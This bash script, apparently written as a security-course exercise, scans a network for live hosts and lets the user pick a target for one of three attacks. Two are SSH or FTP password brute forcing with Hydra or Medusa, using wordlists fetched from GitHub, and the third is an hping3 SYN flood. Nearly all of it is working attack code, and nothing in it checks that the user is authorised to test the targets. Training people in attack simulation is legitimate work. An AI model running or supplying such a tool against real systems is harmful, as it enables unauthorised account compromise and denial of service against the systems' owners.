#!/bin/bash

# Title: Attack Simulation Script
# Name: Benedict Kam
# Student Code: s5
# Trainer: Samson
# Description: Simulates different types of attacks using Nmap, Hydra, Medusa, and Hping3.
# Usage: Follow the menu prompts to select and run an attack.

DEFAULT_PASSWORD_URL="https://raw.githubusercontent.com/scestia/Password_List/main/xato1000.txt"
DEFAULT_USERNAME_URL="https://raw.githubusercontent.com/scestia/Password_List/main/top-usernames-shortlist.txt"

# Check for sudo access
if ! sudo -v >/dev/null 2>&1; then
    echo "[!] This script requires sudo privileges. Exiting."
    exit 1
fi

# Check and install dependencies
check_and_install() {
    for pkg in "$@"; do
        if ! command -v "$pkg" >/dev/null 2>&1; then
            echo "[*] $pkg not found. Installing..."
            sudo apt-get update && sudo apt-get install -y "$pkg"
        fi
    done
    echo "All Packages Installed"
}

check_and_install nmap hydra hping3 curl medusa

# Prompt user for network range or single IP
read -p "Enter a network range (e.g. 192.168.1.0/24) or a single IP to scan: " NETWORK

# Function to detect live hosts on the network
discover_hosts() {
    echo "[*] Scanning network for live hosts in $NETWORK..."
    mapfile -t LIVE_HOSTS < <(sudo nmap -sn "$NETWORK" | grep "Nmap scan report" | awk '{print $5}')
    if [ ${#LIVE_HOSTS[@]} -eq 0 ]; then
        echo "[!] No live hosts found. Exiting."
        exit 1
    fi
    echo "[*] Live Hosts:"
    for ip in "${LIVE_HOSTS[@]}"; do
        echo " - $ip"
    done
}

prompt_for_creds() {
    local type="$1"
    echo "[*] $type Brute Force Attack:"
    read -p "Use default username list? (y/n): " use_default_user
    if [[ "$use_default_user" == "y" ]]; then
        user_list="top-usernames-shortlist.txt"
        [ ! -f "$user_list" ] && curl -s -O "$DEFAULT_USERNAME_URL"
    else
        read -p "Enter path to username list or a single username: " user_list
    fi

    read -p "Use default password list? (y/n): " use_default_pass
    if [[ "$use_default_pass" == "y" ]]; then
        pass_list="xato1000.txt"
        [ ! -f "$pass_list" ] && curl -s -O "$DEFAULT_PASSWORD_URL"
    else
        read -p "Enter path to password list or a single password: " pass_list
    fi

    read -p "Choose tool (1 for Hydra, 2 for Medusa): " tool_choice
    TOOL="hydra"
    [[ "$tool_choice" == "2" ]] && TOOL="medusa"
}

# Attack 1: SSH Brute Force
ssh_brute_force() {
    prompt_for_creds "SSH"
    if [[ "$TOOL" == "hydra" ]]; then
        if [[ -f "$user_list" && -f "$pass_list" ]]; then
            hydra -L "$user_list" -P "$pass_list" ssh://"$1"
        else
            hydra -l "$user_list" -p "$pass_list" ssh://"$1"
        fi
    else
        if [[ -f "$user_list" && -f "$pass_list" ]]; then
            medusa -f -h "$1" -U "$user_list" -P "$pass_list" -M ssh
        else
            medusa -f -h "$1" -u "$user_list" -p "$pass_list" -M ssh
        fi
    fi
}

# Attack 2: FTP Brute Force
ftp_brute_force() {
    prompt_for_creds "FTP"
    if [[ "$TOOL" == "hydra" ]]; then
        if [[ -f "$user_list" && -f "$pass_list" ]]; then
            hydra -L "$user_list" -P "$pass_list" ftp://"$1"
        else
            hydra -l "$user_list" -p "$pass_list" ftp://"$1"
        fi
    else
        if [[ -f "$user_list" && -f "$pass_list" ]]; then
            medusa -f -h "$1" -U "$user_list" -P "$pass_list" -M ftp
        else
            medusa -f -h "$1" -u "$user_list" -p "$pass_list" -M ftp
        fi
    fi
}

# Attack 3: SYN Flood with Hping3
syn_flood() {
    echo "[*] SYN Flood Attack: Floods port 80 with SYN packets."
    timeout 30 sudo hping3 -S -p 80 --flood "$1"
}

# Menu
declare -A ATTACKS
ATTACKS=(
    ["1"]="SSH Brute Force - Attempts to brute-force SSH login"
    ["2"]="FTP Brute Force - Attempts to brute-force FTP login"
    ["3"]="SYN Flood - Sends flood of SYN packets to port 80"
)

show_attacks() {
    echo "Available Attacks:"
    for key in "${!ATTACKS[@]}"; do
        echo " [$key] ${ATTACKS[$key]}"
    done
}

# Main Script
discover_hosts
show_attacks

read -p "Choose an attack number or type 'r' for random: " choice

if [[ "$choice" == "r" ]]; then
    choice=$(( ( RANDOM % 3 ) + 1 ))
    echo "[*] Randomly selected attack: $choice"
elif [[ ! ${ATTACKS[$choice]} ]]; then
    echo "[!] Invalid selection. Exiting."
    exit 1
fi

echo "[*] Selected: ${ATTACKS[$choice]}"

echo "Available Targets:"
for i in "${!LIVE_HOSTS[@]}"; do
    echo " [$i] ${LIVE_HOSTS[$i]}"
done

read -p "Choose target number or type 'r' for random: " target_choice

if [[ "$target_choice" == "r" ]]; then
    target_index=$(( RANDOM % ${#LIVE_HOSTS[@]} ))
else
    target_index=$target_choice
fi

TARGET_IP="${LIVE_HOSTS[$target_index]}"
echo "[*] Target selected: $TARGET_IP"

# Execute selected attack
case $choice in
    1) ssh_brute_force "$TARGET_IP" ;;
    2) ftp_brute_force "$TARGET_IP" ;;
    3) syn_flood "$TARGET_IP" ;;
esac

echo "[*] Attack completed."
